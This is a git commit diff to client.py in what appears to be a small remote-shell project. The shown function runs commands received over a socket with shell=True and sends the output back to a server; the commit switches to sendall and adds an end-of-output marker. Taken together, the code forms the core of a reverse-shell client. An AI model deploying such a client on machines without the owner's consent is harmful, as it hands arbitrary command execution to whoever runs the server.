a7ed11d03a11e53ef0648161cca603cdf2df50c6
michaelnkr808 <226908033+michaelnkr808@users.noreply.github.com>
2025-08-29 23:09:54 -0700

    Use sendall so large outputs aren't truncated

--- client.py
+++ client.py
@@ -11,9 +11,10 @@ def server_connect():
     return s
 
 def execute_command(s, command):
+    print("Executing:", repr(command))
     result = subprocess.run(command, capture_output = True, text=True, shell=True)
     output = result.stdout if result.stdout else result.stderr
-    s.send(output.encode())
+    s.sendall((output + "<END_OF_OUTPUT>").encode())
 
 s = server_connect()
 
